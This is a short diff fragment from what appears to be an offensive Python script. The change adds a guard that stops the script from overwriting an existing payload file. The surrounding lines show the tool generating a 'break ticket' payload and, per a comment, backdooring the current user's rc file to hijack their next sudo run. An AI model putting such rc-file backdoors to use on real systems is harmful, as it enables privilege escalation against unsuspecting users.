@@ -117,7 +117,10 @@ def main(args):
     
     if not os.path.isfile(args.payload):
         gen_break_ticket_payload(args.payload)
-
+    else:
+        print("I no overwrite the file")
+        sys.exit()
+        
     # backdoor the rc file of the current user so the next 
     # time they run sudo 
     if args.b:  
